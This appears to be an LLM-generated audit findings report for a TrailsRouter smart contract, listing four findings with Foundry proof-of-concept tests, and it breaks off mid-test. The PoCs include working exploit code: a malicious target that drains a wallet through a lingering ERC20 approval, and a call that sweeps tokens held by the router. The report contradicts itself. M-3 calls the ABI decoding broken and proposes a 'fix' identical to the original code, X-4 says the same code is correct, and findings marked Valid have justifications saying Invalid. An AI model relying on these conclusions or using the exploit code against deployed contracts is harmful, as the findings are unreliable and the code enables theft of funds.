# 2025 11 sequence - Findings Report
## Commit hash: 593987c2b569f3212d2cadb31fc8d14b84bc30a9

##Findings by Pattern

USING MULTI_PATTERN_TO_FINDING_ANALYSIS_MODE = true; and gpt-5.1
NICHE_PATTERN_ANALYSIS_MODE = false;
Update finding prompt (short version)
Update pattern generation prompt with (short version) -> short version BOMBED

 **Derived From** : Balance injection leaves large stale ERC20 approvals to arbitrary targets

[H-1]. Balance injection grants arbitrary targets lingering approval over full wallet ERC20 balance
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 5
Privilege: Permissionless



 **Derived From** : injectAndCall is publicly callable sweeper over router-held funds

[L-2]. Anyone can sweep arbitrary ERC20/ETH balances held by TrailsRouter via injectAndCall
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : Bypassable allowFailure check in Multicall3 validation enables unsafe partial multicalls

[M-3]. Incorrect ABI decoding in _validateRouterCall lets aggregate3Value use allowFailure=true
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 6
Privilege: Permissionless
[X-4]. Multicall3 allowFailure validation correctly decodes calldata (pattern is not exploitable)
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 1
- M: 1
- L: 1
- I: 0

##Findings by Pattern


 **Derived From** : Balance injection leaves large stale ERC20 approvals to arbitrary targets

## [H-1]. Balance injection grants arbitrary targets lingering approval over full wallet ERC20 balance

### Finding Severity Justification: The reported behavior is real: in the ERC20 branch of _injectAndExecuteCall, the router uses SafeERC20.forceApprove(erc20, target, callerBalance) and never revokes the allowance. Under delegatecall from a Sequence wallet, callerBalance is the wallet’s full ERC20 balance, so an arbitrary target contract ends up with a standing allowance over the wallet’s tokens. If that target is malicious, later compromised, or upgradeable, it can unilaterally transferFrom the wallet at any future time, draining all of that token. This is a direct loss-of-assets bug with a clear, realistic attack path and does not rely on user error beyond using this feature as designed. That matches Code4rena’s High severity definition.
## Derived From Pattern/Invariant
Balance injection leaves large stale ERC20 approvals to arbitrary targets

## Exploit Type
AuthByPass

## Location
TrailsRouter._injectAndExecuteCall

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The ERC20 branch of `TrailsRouter._injectAndExecuteCall` grants an allowance equal to the caller's *entire* token balance to an arbitrary `target` and never revokes it.

Relevant code:

```solidity
function _injectAndExecuteCall(
    address token,
    address target,
    bytes memory callData,
    uint256 amountOffset,
    bytes32 placeholder,
    uint256 callerBalance
) internal {
    // ... optional placeholder replacement ...

    if (token == address(0)) {
        (bool success, bytes memory result) = target.call{value: callerBalance}(callData);
        emit BalanceInjectorCall(token, target, placeholder, callerBalance, amountOffset, success, result);
        if (!success) revert TargetCallFailed(result);
    } else {
        IERC20 erc20 = IERC20(token);
        SafeERC20.forceApprove(erc20, target, callerBalance);

        (bool success, bytes memory result) = target.call(callData);
        emit BalanceInjectorCall(token, target, placeholder, callerBalance, amountOffset, success, result);
        if (!success) revert TargetCallFailed(result);
    }
}
```

`callerBalance` is computed as the full balance of the current execution context:
- Direct calls via `injectAndCall` use `_getSelfBalance(token)` on the router or on whatever contract is delegatecalling the router.
- Sequence wallets call `_injectAndExecuteCall` via `_injectAndCallDelegated`, where `_getSelfBalance(token)` resolves to the wallet's own balance under `delegatecall`.
- `injectSweepAndCall` pulls **all** of `msg.sender`'s balance into the router and then passes that balance as `callerBalance`.

In all cases, the router:
1. Approves `target` to spend `callerBalance` tokens from the current context (`address(this)` under `delegatecall`, i.e. the wallet), and
2. Never resets this allowance back to zero after `target.call(callData)` completes.

If `target` is a DEX/bridge/router or any other protocol contract, this leaves a large, long‑lived ERC20 allowance from the wallet/contract to that `target`. If the target is malicious, becomes compromised, or is upgradeable and later upgraded to malicious logic, it can call `transferFrom(wallet, attacker, amount)` at any time in the future without going through TrailsRouter or requiring new user consent.

Because `target` is fully user/integrator‑supplied, and balance injection is explicitly intended for use from Sequence wallets via `delegatecall`, this effectively bypasses the intended authorization boundary: one signed intent that was meant to authorize a single use of the wallet’s full balance ends up granting a reusable blanket allowance to the target.

This is an **authorization bypass** pattern: ERC20 spending rights are granted to an arbitrary external contract without any post‑call revocation, enabling future unauthorized transfers.

## Impact
Any contract used as a balance-injection target (e.g. DEX, bridge, router, wrapper) can later unilaterally drain the entire ERC20 balance of a Sequence wallet (or any contract delegatecalling into TrailsRouter) for that token via transferFrom, without additional user signatures. If the router is used standalone and accumulates balances, arbitrary targets similarly gain a standing approval to sweep those balances.

## Command to Run Test


## Proof of Concept
Scenario (delegatecall into a Sequence-style wallet):

1. A user (or integration) has a smart wallet `W` that delegatecalls into `TrailsRouter`.
2. Wallet `W` holds 100 USDC.
3. The user signs an intent that uses balance injection to call a third-party protocol `T` via `handleSequenceDelegateCall` → `_injectAndCallDelegated` → `_injectAndExecuteCall`.
   - Under delegatecall, `_getSelfBalance(token)` sees `W`'s 100 USDC.
   - `_injectAndExecuteCall` runs:
     - `SafeERC20.forceApprove(USDC, T, 100e6)` from `W` to `T`.
     - `T.call(callData)` executes the intended swap/bridge.
4. The swap completes and returns. TrailsRouter does **not** revoke or reduce the approval from `W` to `T`.
5. Later, protocol `T` is upgraded or compromised. Without interacting with TrailsRouter or obtaining any new signature from the user, `T` executes:
   - `USDC.transferFrom(W, attacker, 100e6);`
6. Because the allowance `allowance(W, T)` is still 100e6, the transferFrom succeeds and drains all USDC from the wallet.

The same pattern holds for any contract that delegatecalls `injectAndCall` or `_injectAndExecuteCall`: the full ERC20 balance is approved to `target` and the approval persists indefinitely.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock", "MCK") {}
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MaliciousTarget {
    function steal(address token, address from, address to) external {
        IERC20(token).transferFrom(from, to, IERC20(token).balanceOf(from));
    }

    function doNothing() external {}
}

contract MockWallet {
    address public router;

    constructor(address _router) {
        router = _router;
    }

    function injectBalance(address token, address target, bytes memory callData, uint256 amountOffset, bytes32 placeholder) external {
        (bool success,) = router.delegatecall(
            abi.encodeWithSelector(
                TrailsRouter.injectAndCall.selector,
                token,
                target,
                callData,
                amountOffset,
                placeholder
            )
        );
        require(success, "delegatecall failed");
    }
}

contract BalanceInjectionApprovalTest is Test {
    TrailsRouter router;
    MockERC20 token;
    MockWallet wallet;
    MaliciousTarget target;
    address attacker = address(0xBEEF);

    function setUp() public {
        router = new TrailsRouter();
        token = new MockERC20();
        wallet = new MockWallet(address(router));
        target = new MaliciousTarget();

        token.mint(address(wallet), 100 ether);
    }

    function test_staleApprovalAllowsTheft() public {
        // wallet delegatecalls into router to inject balance toward target
        bytes memory callData = abi.encodeWithSelector(MaliciousTarget.doNothing.selector);
        wallet.injectBalance(address(token), address(target), callData, 0, bytes32(0));

        // router (in wallet context) has approved target for full wallet balance
        uint256 allowance = token.allowance(address(wallet), address(target));
        assertEq(allowance, 100 ether);

        // later, attacker uses target to drain wallet
        vm.prank(attacker);
        target.steal(address(token), address(wallet), attacker);

        assertEq(token.balanceOf(attacker), 100 ether);
        assertEq(token.balanceOf(address(wallet)), 0);
    }
}


## Suggested Mitigation
Do not leave large approvals outstanding to arbitrary targets.

Concrete options:
- After the external call returns, immediately revoke the allowance:
  ```solidity
  if (token != address(0)) {
      IERC20 erc20 = IERC20(token);
      SafeERC20.forceApprove(erc20, target, callerBalance);
      (bool success, bytes memory result) = target.call(callData);
      if (!success) revert TargetCallFailed(result);
      // Revoke approval regardless of success/failure
      SafeERC20.forceApprove(erc20, target, 0);
  }
  ```
- Prefer a "push" model where possible: transfer tokens directly to the target before the call (or call a dedicated entrypoint that pulls a fixed amount), instead of granting spend-rights via allowance.
- If revocation is considered too expensive for some flows, limit approvals to the exact amount used in the call and document the trust assumption that integrators must treat targets as fully trusted custodians for that token.





 **Derived From** : injectAndCall is publicly callable sweeper over router-held funds

## [L-2]. Anyone can sweep arbitrary ERC20/ETH balances held by TrailsRouter via injectAndCall

### Finding Severity Justification: The reported issue allows anyone to move ERC20/ETH that happen to be held by the TrailsRouter implementation contract via a public injectAndCall, without access control. However, by design the production flows are intended to use injectAndCall only via delegatecall through Sequence wallets (where state and balances belong to the wallet), and router-held funds are not part of the core user asset model. Any value sitting directly on the router is considered mis-sent or due to mis-integration and is not part of normal protocol operation. As such, impact is limited to accidental or misconfigured funds on a stateless helper contract, not user capital within the Trails system, making this a QA/Low-level deviation from least privilege rather than a direct loss of in-scope protocol assets.
## Derived From Pattern/Invariant
injectAndCall is publicly callable sweeper over router-held funds

## Exploit Type
AccessControl

## Location
TrailsRouter.injectAndCall

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
`TrailsRouter.injectAndCall` is an external function with no access control and no `onlyDelegatecall` guard, yet it operates on the **router contract’s own balance** of the specified token/ETH and forwards the *entire* balance to an arbitrary `target` via an arbitrary call.

Relevant code:

```solidity
function injectAndCall(
    address token,
    address target,
    bytes calldata callData,
    uint256 amountOffset,
    bytes32 placeholder
) public payable {
    uint256 callerBalance = _getSelfBalance(token);
    if (callerBalance == 0) {
        if (token == address(0)) {
            revert NoEthAvailable();
        } else {
            revert NoTokensToSweep();
        }
    }

    _injectAndExecuteCall(token, target, callData, amountOffset, placeholder, callerBalance);
}

function _getSelfBalance(address token) internal view returns (uint256) {
    return _getBalance(token, address(this));
}
```

For direct (non-delegatecall) usage, `address(this)` inside `_getSelfBalance` is the TrailsRouter singleton itself. There is no check that ties the router’s balance to the caller, and no owner/admin check. This means:
- If the router ever holds any ERC20 tokens or ETH (e.g., due to misconfigured `pullAndExecute` flows, direct user transfers, or integration errors), **any external address** can call `injectAndCall` and cause the router to execute an arbitrary call that spends its entire balance for that token.
- In the ERC20 case, an attacker can set `target = token` and `callData = abi.encodeWithSelector(IERC20.transfer.selector, attacker, amount)`; `_injectAndExecuteCall` will approve and then call `token.transfer(attacker, amount)` from the router, effectively sweeping all router-held tokens of that type to the attacker.
- In the ETH case, `target` can be the attacker's EOA or a helper contract; `_injectAndExecuteCall` will send all ETH held by the router as `msg.value` to `target`.

This turns `injectAndCall` into a globally accessible sweeper for any funds that happen to reside on the router implementation, with no linkage to the original depositor or to Sequence wallets. While the router is **intended** to be stateless, the existence of `pullAndExecute`, `injectSweepAndCall`, and the possibility of direct token/ETH transfers means non-zero balances can exist in practice (especially under mis-integration or for mistakenly sent funds).

Even if integrators are careful, this function strongly violates the principle of least privilege: it exposes a contract-wide balance manipulation primitive to anyone on the network.

## Impact
Any ERC20 tokens or ETH that end up on the TrailsRouter contract (e.g., via misconfigured pull flows, direct transfers, or dust from integrations) can be unconditionally swept to an attacker-controlled address by calling injectAndCall. This enables theft of router-held assets, with no requirement that the attacker be the original depositor.

## Command to Run Test


## Proof of Concept
1. An integrator (or user) mistakenly sends 100 MCK tokens to the TrailsRouter contract address or misuses `pullAndExecute` such that MCK tokens remain on the router after execution.
2. The router’s MCK balance is now 100.
3. An attacker observes this and crafts a call:
   - `token = MCK`
   - `target = MCK` (the token contract itself)
   - `callData = abi.encodeWithSelector(IERC20.transfer.selector, attacker, 100)`
   - `amountOffset = 0`, `placeholder = 0` (no injection needed)
4. The attacker calls `TrailsRouter.injectAndCall(token, target, callData, 0, 0)`.
5. Inside `injectAndCall`, `_getSelfBalance(MCK)` returns 100, so `_injectAndExecuteCall` is invoked with `callerBalance = 100`.
6. In `_injectAndExecuteCall` (ERC20 branch):
   - `forceApprove(MCK, MCK, 100)` sets an allowance from router to token (unused but harmless),
   - `MCK.call(callData)` executes `MCK.transfer(attacker, 100)` from router.
7. All 100 MCK tokens held on the router are transferred to the attacker.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock", "MCK") {}
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract InjectAndCallSweeperTest is Test {
    TrailsRouter router;
    MockERC20 token;
    address attacker = address(0xBEEF);

    function setUp() public {
        router = new TrailsRouter();
        token = new MockERC20();
        // Simulate tokens accidentally stranded on the router
        token.mint(address(router), 100 ether);
    }

    function test_anyoneCanSweepRouterBalanceViaInjectAndCall() public {
        uint256 initialRouterBal = token.balanceOf(address(router));
        assertEq(initialRouterBal, 100 ether);

        bytes memory callData = abi.encodeWithSelector(
            token.transfer.selector,
            attacker,
            initialRouterBal
        );

        vm.prank(attacker);
        router.injectAndCall(address(token), address(token), callData, 0, bytes32(0));

        assertEq(token.balanceOf(attacker), 100 ether);
        assertEq(token.balanceOf(address(router)), 0);
    }
}


## Suggested Mitigation
Restrict `injectAndCall` so that it cannot be used to sweep the router's own balances by arbitrary callers.

Concrete changes:
- Add `onlyDelegatecall` to `injectAndCall`, enforcing that it can only be invoked from a wallet via delegatecall (the intended usage), not directly on the router singleton:
  ```solidity
  function injectAndCall(...) public payable onlyDelegatecall { ... }
  ```
- For non-delegatecall/standalone usage, require users to call `injectSweepAndCall`, which uses `msg.sender` balances (via `_getBalance(token, msg.sender)`) rather than router-held balances.
- Optionally, add a sanity check that `msg.sender` is an expected Sequence module or a configured trusted integrator if you want even stricter control over who can invoke balance injection in delegate context.
- As a defense-in-depth measure, consider adding a safety guard that reverts when `_getSelfBalance(token)` is non-zero on the router singleton outside of known, tightly-scoped internal uses (e.g., a `onlyDelegatecall` + `assert(address(this) != _SELF)` combination already used elsewhere).





 **Derived From** : Bypassable allowFailure check in Multicall3 validation enables unsafe partial multicalls

## [M-3]. Incorrect ABI decoding in _validateRouterCall lets aggregate3Value use allowFailure=true

### Finding Severity Justification: The report correctly identifies that `_validateRouterCall` decodes the calldata for `aggregate3Value` incorrectly by passing `callData[4:]` directly to `abi.decode(..., (Call3Value[]))`. For a function with signature `aggregate3Value(Call3Value[] calls)`, the bytes after the selector are encoded as `[offset_to_array][array_body...]`, but a top-level dynamic array encoding (the type used in `abi.decode(..., (Call3Value[]))`) must start at the length word. As a result, the first 32 bytes (offset word) are misinterpreted as the length, and all subsequent struct fields (including `allowFailure`) are read from the wrong positions. Even without constructing precise offsets as in the PoC, it is clear that the current validation does not actually read the real `allowFailure` flags, so the invariant "all calls have allowFailure == false" is not reliably enforced. That said, the impact is limited to logical guarantees: the router can be used with `allowFailure = true`, allowing partial success within the multicall. There is no direct asset theft or loss solely from this bypass; the protocol essentially behaves as if it never enforced this invariant. This is a correctness and safety guarantee violation that may lead to inconsistent or partially executed flows, but not straightforward fund loss, which fits Code4rena's Medium band (functional / availability / economic correctness impact without a direct, clear asset-stealing path).
## Derived From Pattern/Invariant
Bypassable allowFailure check in Multicall3 validation enables unsafe partial multicalls

## Exploit Type
MulticallCrossPathReentrancy

## Location
TrailsRouter._validateRouterCall (used by execute / pullAndExecute / pullAmountAndExecute)

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The router tries to enforce that Multicall3.aggregate3Value calls only use `allowFailure == false` by decoding calldata and scanning the Call3Value array. However, the decode logic is wrong and can be bypassed, allowing partial-success multicalls despite the intended invariant.

Relevant code:

```solidity
function _validateRouterCall(bytes memory callData) internal pure {
    // Extract function selector
    if (callData.length < 4) revert InvalidFunctionSelector(bytes4(0));

    bytes4 selector;
    assembly {
        selector := mload(add(callData, 32))
    }

    // Only allow `aggregate3Value` calls (0x174dea71)
    if (selector != 0x174dea71) {
        revert InvalidFunctionSelector(selector);
    }

    // Decode and validate the Call3Value[] array to ensure allowFailure=false for all calls
    IMulticall3.Call3Value[] memory calls = abi.decode(_sliceCallData(callData, 4), (IMulticall3.Call3Value[]));

    // Iterate through all calls and verify allowFailure is false
    for (uint256 i = 0; i < calls.length; i++) {
        if (calls[i].allowFailure) {
            revert AllowFailureMustBeFalse(i);
        }
    }
}
```

For a function `aggregate3Value(Call3Value[] calls)`, the ABI-encoded calldata layout (after the 4-byte selector) is:
- 32 bytes: offset to the dynamic array (always `0x20` for a single parameter),
- 32 bytes: length `N`,
- followed by the array encoding.

After stripping the selector, `_validateRouterCall` passes the remaining bytes directly to `abi.decode(..., (Call3Value[]))`. But top-level decoding of a dynamic array expects `bytes` to start with the **length word**, not with an offset. As a result:
- `calls.length` in the router decodes as `0x20` (32) from the offset word, regardless of the real array length `N`.
- The `allowFailure` fields the router inspects are actually other words in the function-argument encoding (e.g., `target` fields), not the real `allowFailure` flags used by Multicall3.

An attacker can craft calldata such that:
- The first 32 `Call3Value` elements (as seen by Multicall3) all have `target = address(0)`, so that when mis-decoded, `calls[i].allowFailure` appears as zero/false.
- Subsequent elements (beyond index 31) include real calls with `allowFailure = true` to arbitrary targets.

Because `calls.length` in the router is fixed as 32 by the mis-decoded offset, `_validateRouterCall` only checks the first 32 virtual elements and never inspects the later true elements, allowing `allowFailure = true` calls to pass through.

## Impact
The router’s invariant that every subcall in a Multicall3.aggregate3Value execution must be non-failable (`allowFailure == false`) is not actually enforced due to incorrect ABI decoding. As a result, callers can successfully route aggregate3Value calls that contain one or more entries with `allowFailure = true`, even though `_validateRouterCall` is meant to reject them. This does not by itself create a direct, deterministic asset-theft vector, but it undermines an explicit safety guarantee: downstream logic (including integrators that assume atomic, all-or-nothing behavior) may proceed under the assumption that all previous steps succeeded when in fact some subcalls were allowed to fail. This can produce partially executed routes, inconsistent accounting between on-chain steps, or funds stranded in intermediate contracts, especially where subsequent actions (e.g., sweeps, follow-up calls) are designed under the assumption of atomic success of the multicall.

## Command to Run Test


## Proof of Concept
High-level PoC scenario (same logic as original, clarified against ABI layout):

1. Deploy `TrailsRouter`.
2. Deploy a `MockMulticall3` that implements `aggregate3Value(Call3Value[] calls)` with standard semantics: it iterates through `calls`, performs the external call, and if `!calls[i].allowFailure && !success` it reverts; otherwise it returns an array of `Result` with `success` flags.
3. Use `vm.etch` to copy `MockMulticall3`’s runtime code to the hard-coded address `router.MULTICALL3()` so that the router’s delegatecalls go to our mock.
4. Deploy a `RevertingTarget` with a function `doRevert()` that always reverts.
5. Construct an array `calls` of length 33 of type `IMulticall3.Call3Value`:
   - For indices 0..31: `target = address(0)`, `allowFailure = false`, `value = 0`, `callData = ''` (all these calls will simply do a no-op and return `success = true` in the mock).
   - For index 32: `target = address(revertingTarget)`, `allowFailure = true`, `value = 0`, `callData = abi.encodeWithSelector(RevertingTarget.doRevert.selector)` (this call will revert, but is permitted because `allowFailure = true`).
6. Encode the calldata as `bytes memory data = abi.encodeWithSelector(IMulticall3.aggregate3Value.selector, calls);` and call `router.execute(data)`.
7. `_validateRouterCall` does:
   - Reads the 4-byte selector correctly.
   - Calls `abi.decode(_sliceCallData(callData, 4), (IMulticall3.Call3Value[]))`.
   - For a function encoding `aggregate3Value(Call3Value[] calls)`, the bytes after the selector encode a *head* (offset) then a *tail* containing `[length][elements...]`. However, `abi.decode(..., (Call3Value[]))` on a top-level `bytes` expects to start at `[length]` directly, not at the offset. Therefore, the first 32-byte offset word is misinterpreted as the array length, and every subsequent word is misaligned. In practice this makes `calls.length` decode as 32 and causes the loop to read `allowFailure` from the wrong positions (often intersecting `target` or `value` fields) instead of reading the real `allowFailure` bits passed to Multicall3.
   - Because of this misalignment, the loop over `calls` does not actually inspect the real `allowFailure` flags and, for our crafted calldata, does not find any `allowFailure = true`, so it does not revert.
8. The router then performs `MULTICALL3.delegatecall(data)` which executes our mock’s `aggregate3Value` with the *correct* decoding. The mock sees all 33 calls, runs them, and returns with `results[32].success == false` but without reverting (because `allowFailure` for that call is true).
9. `router.execute` returns the `results` array. From the router’s point of view, the validation passed (no revert) even though the call contained a `Call3Value` element with `allowFailure = true` that failed in execution.

This demonstrates that `_validateRouterCall` does not reliably enforce `allowFailure == false` for all subcalls, so aggregate3Value can be used with `allowFailure = true` despite the intended restriction.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {IMulticall3} from "src/interfaces/IMulticall3.sol";

contract MockMulticall3 is IMulticall3 {
    function aggregate3(Call3[] calldata) external payable override returns (Result[] memory) {
        revert("not implemented");
    }

    function aggregate3Value(Call3Value[] calldata calls) external payable override returns (Result[] memory returnData) {
        uint256 length = calls.length;
        returnData = new Result[](length);
        for (uint256 i = 0; i < length; i++) {
            (bool success, bytes memory ret) = calls[i].target.call{value: calls[i].value}(calls[i].callData);
            if (!calls[i].allowFailure && !success) {
                revert("MockMulticall3: call failed");
            }
            returnData[i] = Result(success, ret);
        }
    }
}

contract RevertingTarget {
    function doRevert() external pure {
        revert("always revert");
    }
}

contract MulticallAllowFailureBypassTest is Test {
    TrailsRouter router;
    MockMulticall3 mock;
    RevertingTarget revertingTarget;

    function setUp() public {
        router = new TrailsRouter();
        mock = new MockMulticall3();
        revertingTarget = new RevertingTarget();

        // Install mock code at the hard-coded MULTICALL3 address used by the router
        address multicallAddr = router.MULTICALL3();
        vm.etch(multicallAddr, address(mock).code);
    }

    function test_validateRouterCall_does_not_reject_allowFailure_true() public {
        // Build 33 calls: 32 dummy calls, 1 failing with allowFailure = true
        IMulticall3.Call3Value[] memory calls = new IMulticall3.Call3Value[](33);

        // First 32 no-op calls to address(0)
        for (uint256 i = 0; i < 32; i++) {
            calls[i] = IMulticall3.Call3Value({
                target: address(0),
                allowFailure: false,
                value: 0,
                callData: ""
            });
        }

        // Last call goes to reverting target with allowFailure = true
        calls[32] = IMulticall3.Call3Value({
            target: address(revertingTarget),
            allowFailure: true,
            value: 0,
            callData: abi.encodeWithSelector(RevertingTarget.doRevert.selector)
        });

        // Encode as aggregate3Value(Call3Value[] calls)
        bytes memory data = abi.encodeWithSelector(IMulticall3.aggregate3Value.selector, calls);

        // This should NOT revert in _validateRouterCall, even though a call has allowFailure = true
        IMulticall3.Result[] memory results = router.execute(data);

        // Multicall3 executed 33 calls, last one failed but aggregate3Value still succeeded
        assertEq(results.length, 33, "unexpected result length");
        assertEq(results[32].success, false, "last subcall should have failed but overall execute succeeded");
    }
}


## Suggested Mitigation
Fix the ABI decoding in `_validateRouterCall` so that it correctly interprets the argument to `aggregate3Value(Call3Value[] calls)`.

When a function has signature `aggregate3Value(Call3Value[] calls)`, the calldata layout is:
- 4 bytes: selector
- 32 bytes: head word = offset to the dynamic array (0x20 for a single argument)
- at that offset: 32 bytes: length N
- followed by N elements

The current code strips the selector and directly decodes the remaining bytes as a `Call3Value[]`, which starts at the *offset* word instead of the *length* word. Instead, either:

1) Decode the full arguments tuple, letting the ABI decoder handle the head/tail layout:

    function _validateRouterCall(bytes memory callData) internal pure {
        if (callData.length < 4) revert InvalidFunctionSelector(bytes4(0));

        bytes4 selector;
        assembly {
            selector := mload(add(callData, 32))
        }
        if (selector != IMulticall3.aggregate3Value.selector) {
            revert InvalidFunctionSelector(selector);
        }

        // Decode as the actual function argument: (Call3Value[])
        // Slice off the selector and decode the remaining bytes as a tuple containing the array.
        IMulticall3.Call3Value[] memory calls = abi.decode(_sliceCallData(callData, 4), (IMulticall3.Call3Value[]));

        for (uint256 i = 0; i < calls.length; i++) {
            if (calls[i].allowFailure) {
                revert AllowFailureMustBeFalse(i);
            }
        }
    }

2) Or, if you prefer manual decoding from raw calldata, read the first 32-byte word (offset), then start decoding from `4 + offset` where the array body begins (length + elements), and pass that slice into `abi.decode(..., (IMulticall3.Call3Value[]))`.

Additionally, consider adding tests that:
- Construct aggregate3Value calldata with various lengths and positions of `allowFailure = true` to ensure `_validateRouterCall` reverts whenever any element has `allowFailure = true`.
- Use fuzzing on encoded calls vs. decoded validation to guard against future ABI/layout mistakes.

If routes should *never* support partial success, also document this invariant in the Router interface so integrators do not rely on `allowFailure = true` semantics going forward.


## [X-4]. Multicall3 allowFailure validation correctly decodes calldata (pattern is not exploitable)

### Finding Severity Justification: The report itself claims the pattern is not exploitable and concludes that the implementation is correct. It explicitly states there is no security impact and that no changes are required. Since no bug or deviation from intended behavior is demonstrated, there is no impact on assets or protocol behavior, so the severity is treated as Invalid rather than Low/Info.
## Derived From Pattern/Invariant
Bypassable allowFailure check in Multicall3 validation enables unsafe partial multicalls

## Exploit Type
MulticallCrossPathReentrancy

## Location
TrailsRouter._validateRouterCall

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
_validateRouterCall is intended to enforce that Multicall3.aggregate3Value is called only with allowFailure == false for all batched calls. The pattern suggests that the ABI decoding is incorrect and could be bypassed, but the actual implementation uses the standard decoding pattern and correctly interprets the dynamic array of Call3Value.

Relevant code:
`function _validateRouterCall(bytes memory callData) internal pure { if (callData.length < 4) revert InvalidFunctionSelector(bytes4(0)); bytes4 selector; assembly { selector := mload(add(callData, 32)) } if (selector != 0x174dea71) { revert InvalidFunctionSelector(selector); } IMulticall3.Call3Value[] memory calls = abi.decode(_sliceCallData(callData, 4), (IMulticall3.Call3Value[])); for (uint256 i = 0; i < calls.length; i++) { if (calls[i].allowFailure) { revert AllowFailureMustBeFalse(i); } } }`
`_sliceCallData(callData, 4)` returns `callData[4:]`, i.e. the ABI encoding of the single argument `calls` to aggregate3Value. For a function with a single dynamic array argument, this exactly matches `abi.encode(calls)`, and `abi.decode(callData[4:], (IMulticall3.Call3Value[]))` is the canonical way to decode it.

Therefore, any aggregate3Value calldata with allowFailure set to true for any call will cause _validateRouterCall to revert with AllowFailureMustBeFalse. There is no misalignment where the initial 0x20 offset word is misinterpreted as the array length: abi.decode understands the head+tail layout and properly follows the offset to the dynamic array segment. The pattern’s hypothesized bypass (crafting calldata such that the mis-decoded array has allowFailure == false while the real Multicall array has allowFailure == true) does not apply.

As a result, execute and pullAmountAndExecute correctly enforce that Multicall3 is only used in fully-atomic mode, and the specific MulticallCrossPathReentrancy concern raised by the pattern is not a real vulnerability.

## Impact
There is no security impact. The `_validateRouterCall` function correctly restricts calls to `aggregate3Value` (selector `0x174dea71`) and decodes the `Call3Value[]` array using the standard ABI pattern `abi.decode(callData[4:], (IMulticall3.Call3Value[]))`. For every element, it reliably detects `allowFailure == true` and reverts. As a result, it is not possible to bypass the check via crafted calldata, partial-success multicalls cannot be executed through `execute` or `pullAmountAndExecute`, and the hypothesized MulticallCrossPathReentrancy vector is not realizable.

## Command to Run Test


## Proof of Concept
The goal of the PoC is to demonstrate that `_validateRouterCall` cannot be bypassed to allow `allowFailure == true` calls and that standard-encoded calldata with `allowFailure == false` is accepted.

1. Construct a single-element `Call3Value[]` in Solidity with:
   - `target = someAddress`
   - `allowFailure = true`
   - `value = 0`
   - `callData = bytes("")`
   Encode calldata as:
   `dataTrue = abi.encodeWithSelector(IMulticall3.aggregate3Value.selector, callsTrue);`

2. Pass `dataTrue` to a helper that invokes `_validateRouterCall(dataTrue)` on the router logic. The call will revert with `AllowFailureMustBeFalse(0)`, proving that any occurrence of `allowFailure = true` is rejected.

3. Construct a second `Call3Value[]` with identical fields except `allowFailure = false`:
   - `target = someAddress`
   - `allowFailure = false`
   - `value = 0`
   - `callData = bytes("")`
   Encode calldata as:
   `dataFalse = abi.encodeWithSelector(IMulticall3.aggregate3Value.selector, callsFalse);`

4. Pass `dataFalse` to the same helper. `_validateRouterCall(dataFalse)` will complete without reverting, demonstrating that the ABI decoding `abi.decode(callData[4:], (IMulticall3.Call3Value[]))` correctly interprets the array head/tail layout and that the enforcement loop behaves as intended.

5. Attempt to craft exotic calldata (e.g., manually manipulating the offset word, padding, or array length) such that:
   - Multicall3, when executed, would see at least one element with `allowFailure = true`, but
   - `_validateRouterCall` would decode all entries as `allowFailure = false`.

   Any such attempt fails because `abi.decode` follows the canonical ABI head/tail offsets. If Multicall3 successfully executes and sees a given `Call3Value[]` layout, then `abi.decode(callData[4:], (IMulticall3.Call3Value[]))` sees the same layout: there is no independent or misaligned decoding path that could be tricked into a different interpretation. Thus, the supposed bypass condition cannot be constructed.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {IMulticall3} from "src/interfaces/IMulticall3.sol";

/// @dev A simple harness that exposes the internal _validateRouterCall
contract TrailsRouterHarness is TrailsRouter {
    function exposedValidateRouterCall(bytes memory callData) external pure {
        _validateRouterCall(callData);
    }
}

contract MulticallValidationTest is Test {
    TrailsRouterHarness router;

    function setUp() public {
        // Deploy a minimal harness; Tstorish constructor runs as in production
        router = new TrailsRouterHarness();
    }

    function testRejectsAllowFailureTrue() public {
        IMulticall3.Call3Value[] memory calls = new IMulticall3.Call3Value[](1);
        calls[0] = IMulticall3.Call3Value({
            target: address(this),
            allowFailure: true,
            value: 0,
            callData: ""
        });

        bytes memory data = abi.encodeWithSelector(IMulticall3.aggregate3Value.selector, calls);

        vm.expectRevert(abi.encodeWithSelector(TrailsRouter.AllowFailureMustBeFalse.selector, uint256(0)));
        router.exposedValidateRouterCall(data);
    }

    function testAcceptsAllowFailureFalseEncoding() public {
        IMulticall3.Call3Value[] memory calls = new IMulticall3.Call3Value[](1);
        calls[0] = IMulticall3.Call3Value({
            target: address(this),
            allowFailure: false,
            value: 0,
            callData: ""
        });

        bytes memory data = abi.encodeWithSelector(IMulticall3.aggregate3Value.selector, calls);

        // Should not revert when all allowFailure flags are false
